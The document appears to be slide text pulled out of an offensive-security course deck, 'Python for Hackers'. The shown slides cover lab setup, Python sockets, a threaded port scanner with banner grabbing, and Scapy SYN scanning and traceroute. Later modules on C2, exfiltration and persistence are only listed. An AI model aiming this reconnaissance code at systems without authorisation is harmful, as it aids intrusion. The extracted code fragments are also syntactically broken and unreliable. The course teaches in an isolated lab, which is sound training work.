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0.1 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PYTHON FOR HACKERS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>From Novice to Offensive Security</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Engineer in 30 Days</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Series Introduction</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[Presenter Name] | [Date] | [Conference]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0.2  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YOUR COMPLETE TOOLKIT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>RECON           WEB          EXPLOIT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Scanner        Brute-         Framework</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Sniffer        Forcer         Payloads</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Packet         Analyzer       Exfil</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>C2           POST-          PACKAGING</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Server         EXPLOIT        Deploy</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Agent         Enum            Signed</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Persist        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0.3 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WHO THIS IS FOR</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Security Analysts   →    Automate analysis &amp; testing</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Penetration Testers →    Build custom tools</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Red Teamers        →    Develop bespoke C2 &amp; payloads</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Software Engineers →    Transition into security</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Prerequisites:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>✓ Basic Python syntax</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>✓ Command line familiarity</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>✓ Fundamental networking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0.4 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OFENSIVE PYTHON TOOLKIT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>C2 MODULE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>HTTP/HTTPS  DNS Tunneling  ICMP Channel</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>RECONNAISSANCE MODULE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Port Scanner  Banner Grabber  Directory Brute</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>WEB ATTACK MODULE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>HTTP Client  Form Parser  Auth Automation</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>EXPLOIT MODULE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Payload Generator  Obfuscation  Exfiltration</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>POST-EXPLOITATION MODULE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Enumerator  Persistence  Packaging</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>CORE FRAMEWORK</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Config  Logging  Error Handling  Thread Pool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0.5 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30-DAY LEARNING PATH</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 1-2      Foundation &amp; Environment Setup</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 3-4      Network Programming with Sockets</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 5-7      Web Reconnaissance &amp; Automation</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 8-9      Exploit Development</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 10-11    Payload Obfuscation</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 12-14    Data Exfiltration</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 15-18    C2 Framework Development</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 19-22    Post-Exploitation &amp; Persistence</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 23-25    Packaging &amp; Deployment</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>DAY 26-30    Real-World Scenarios &amp; CTF Practice</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>⏱ Total: 30 Days • 15,000+ Lines of Code</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>35+ Files • 40+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1.1.1  Why a Virtual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VIRTUAL LAB CONCEPT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Think of it like setting up a boxing gym:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Safe practice space = Isolated network</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Practice partners = Vulnerable target VMs</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Training gear = Kali Linux with tools</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Protective equipment = Snapshots to roll back</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Why VMs?</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Completely isolated networks</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Rollback to clean state</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Multiple OS simultaneously</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Zero impact on host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1.1.2 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LAB ARCHITECTURE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>HOST MACHINE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Your Computer)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Kali         Ubuntu       Windows</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Attacker      Target       Target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>192.168.     192.168.     192.168.</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>100.10       100.20        100.30</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Virtual Network: 192.168.100.0/24 (Host-Only)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>🔒 Completely isolated from the internet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1.1.3  Setup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SETUP COMMANDS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># System Updates</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sudo apt update &amp;&amp; sudo apt upgrade -y</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Install Python 3</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sudo apt install python3 python3-pip python3-venv -y</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Create project directory</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>mkdir ~/hacking-toolkit</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cd ~/hacking-toolkit</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Virtual environment</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>python3 -m venv hacker-env</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>source hacker-env/bin/activate</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Directory structure</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>mkdir -p {recon,web-attack,exploit,post-exploit}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>mkdir -p {framework,payloads,config,modules,utils}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1.2.1  What is a Socket?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SOCKET ANALOGY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>A socket is like a telephone line between computers:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>You → Pick up phone (create socket)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>→ Dial number (connect to server)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>→ Talk (send request)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>→ Listen (receive response)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>→ Hang up (close connection)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>TCP = Phone call (reliable, ordered)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UDP = Postcard (fast, unreliable)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Socket types:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.AF_INET → IPv4</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.SOCK_STREAM → TCP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.SOCK_DGRAM → UDP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1.2.2  TCP Client-Server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TCP CLIENT-SERVER</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SERVER                        CLIENT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>1. socket()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>2. bind()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>3. listen()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>4. accept()      ◄  connect()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>5. recv()        ◄  send()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>6. send()        ►  recv()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>7. close()       ►  close()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Code Example:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>server_socket = socket.socket(AF_INET, SOCK_STREAM)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>server_socket.bind(('0.0.0.0', 9999))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>server_socket.listen(5)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1.2.3  TCP Server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TCP ECHO SERVER</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import socket</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import threading</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class TCPEchoServer:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def __init__(self, host='0.0.0.0', port=9999):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.host = host</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.port = port</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.server_socket = None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def start(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.server_socket = socket.socket(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.AF_INET, socket.SOCK_STREAM</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.server_socket.setsockopt(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.SOL_SOCKET, socket.SO_REUSEADDR, 1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.server_socket.bind((self.host, self.port))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.server_socket.listen(5)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>while True:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>client, addr = self.server_socket.accept()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>thread = threading.Thread(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>target=self.handle_client,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>args=(client, addr)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>thread.start()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1.2.4  TCP Client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TCP CLIENT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import socket</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class TCPEchoClient:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def __init__(self, host='127.0.0.1', port=9999):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.host = host</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.port = port</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.socket = None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def connect(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.socket = socket.socket(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.AF_INET, socket.SOCK_STREAM</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.socket.settimeout(3.0)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.socket.connect((self.host, self.port))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def send_message(self, message):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.socket.send(message.encode('utf-8'))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.socket.recv(1024)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return response.decode('utf-8')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def disconnect(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.socket.close()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1.2.5  UDP Client-Server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UDP VS TCP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UDP = Connectionless (like sending postcards)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UDP Server:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock = socket.socket(AF_INET, SOCK_DGRAM)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.bind(('0.0.0.0', 9998))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data, addr = sock.recvfrom(1024)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.sendto(data, addr)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UDP Client:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock = socket.socket(AF_INET, SOCK_DGRAM)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.sendto(b'Hello', ('127.0.0.1', 9998))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data, addr = sock.recvfrom(1024)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Key Difference: No connection needed!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1.3.1  What is Port Scanning?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PORT SCANNING ANALOGY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like checking doors and windows in a building:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• IP Address = Building address</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Ports = Doors (numbered 1-65535)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Open port = Unlocked door</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Closed port = Locked door</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Filtered = Guarded door (can't tell)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Why we scan:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Discover running services</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Identify OS (service fingerprints)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Find attack vectors</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Connect Scan = Full TCP handshake</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SYN Scan = Only SYN packet (stealth)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1.3.2  Scanner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SCANNER ARCHITECTURE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>PortScanner</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- ports[]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- max_threads</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- timeout</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- results[]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>▼                        ▼                        ▼</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Worker              Worker               Worker</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Thread              Thread               Thread</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Result Queue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1.3.3  Port Scanning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PORT SCANNER CODE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import socket</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import threading</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import queue</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class PortScanner:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def __init__(self, target, ports, max_threads=50,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>timeout=2.0):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.target = target</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.ports = ports</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.max_threads = max_threads</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.timeout = timeout</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.open_ports = []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.scan_queue = queue.Queue()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.lock = threading.Lock()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def scan_port(self, port):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>try:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock = socket.socket(AF_INET, SOCK_STREAM)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.settimeout(self.timeout)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = sock.connect_ex(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(self.target, port)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if result == 0:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return {'port': port, 'state': 'open'}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.close()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>except: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1.3.4  Banner Grabbing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BANNER GRABBING</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def grab_banner(self, sock, port):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>try:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># HTTP ports</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if port in [80, 443, 8080]:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.send(b'HEAD / HTTP/1.0\r\n\r\n')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># SMTP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif port == 25:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.send(b'HELO localhost\r\n')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># FTP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif port == 21:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>sock.send(b'USER anonymous\r\n')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>else:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Just read what comes back</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pass</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>banner = sock.recv(1024).strip()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return banner.decode('utf-8', errors='ignore')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>except:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return None</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Service Signatures:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SSH → b'SSH', b'OpenSSH'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>HTTP → b'Apache', b'nginx', b'Server:'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>FTP → b'220', b'vsFTPd'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1.3.5  Scanner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SCANNER OUTPUT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>$ python3 port_scanner.py 192.168.1.1 -p 22,80,443</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[*] Starting port scan on 192.168.1.1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[*] Scanning 3 ports using 50 threads</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[*] Timeout: 2.0s, Banner grabbing: True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[*] Start time: 2024-01-15 14:30:25</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[+] Port 22 is OPEN - ssh</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[+] Port 80 is OPEN - http</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[*] Progress: 3/3 ports scanned (100.0%)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>[*] Scan completed in 0.23 seconds</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>=========================================================</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>SCAN RESULTS FOR 192.168.1.1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>=========================================================</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>PORT  STATE  SERVICE   VERSION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>22    open   ssh      SSH-2.0-OpenSSH_8.9p1</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>80    open   http     Apache/2.4.52</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>=========================================================</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Total open ports: 2</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Scan duration: 0.23 seconds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1.4.1  What is Scapy?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SCAPY OVERVIEW</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Scapy = Python's most powerful packet library</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Capabilities:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Create packets at any layer</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Send packets and receive responses</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Sniff network traffic</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Analyze packet contents</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Implement custom protocols</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Layer stacking:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Ethernet → IP → TCP/UDP/ICMP → Payload</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Ether() / IP() / TCP()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Common Layers:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Ether - Ethernet frame</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>IP - Internet Protocol</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>TCP - Transmission Control Protocol</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UDP - User Datagram Protocol</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>ICMP - Internet Control Message Protocol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1.4.2  Creating Packets with Scapy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CREATING PACKETS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>from scapy.all import *</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># IP Packet</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>ip = IP(src="192.168.1.1", dst="8.8.8.8", ttl=64)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># TCP Packet</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>tcp = TCP(sport=12345, dport=80, flags="S")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># UDP Packet</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>udp = UDP(sport=12345, dport=53)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># ICMP Packet (Ping)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>icmp = ICMP(type=8, code=0)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Combine Layers</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet = ip / tcp   # IP + TCP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet = ip / udp   # IP + UDP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet = ip / icmp  # IP + ICMP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Ethernet Frame</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>eth = Ether(src="00:11:22:33:44:55",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>dst="aa:bb:cc:dd:ee:ff")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet = eth / ip / tcp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1.4.3  Sending &amp; Receiving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SENDING &amp; RECEIVING</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>from scapy.all import *</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Send packet (no response)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>send(packet)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Send and receive 1 response</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = sr1(packet)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Send and receive multiple</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>answers, unanswered = sr(packet)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Sniff packets</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packets = sniff(count=10, filter="tcp", timeout=5)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Show packet details</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet.show()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet.summary()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>hexdump(packet)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Save/Load packets</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>wrpcap('capture.pcap', packets)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packets = rdpcap('capture.pcap')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1.4.4  TCP Connect Scan with Scapy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TCP SCAN WITH SCAPY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def tcp_connect_scan(self, target, ports):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>open_ports = []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for port in ports:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Create SYN packet</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>ip = IP(dst=target)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>tcp = TCP(dport=port, flags='S')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet = ip / tcp</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Send and receive</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = sr1(packet, timeout=2)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Check for SYN-ACK</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if response and response[TCP].flags &amp; 0x12:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>open_ports.append(port)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Send RST to close connection</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>rst = IP(dst=target) / TCP(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>dport=port, flags='R'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>send(rst)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return open_ports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1.4.5  Traceroute with Scapy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TRACEROUTE WITH SCAPY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def traceroute(self, target, max_hops=30):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>hops = []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for ttl in range(1, max_hops + 1):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Create packet with TTL</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>packet = IP(dst=target, ttl=ttl) / ICMP()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Send and wait for response</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = sr1(packet, timeout=2)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if response:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>src_ip = response.src</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>hops.append(src_ip)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if src_ip == target:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>break</a:t>
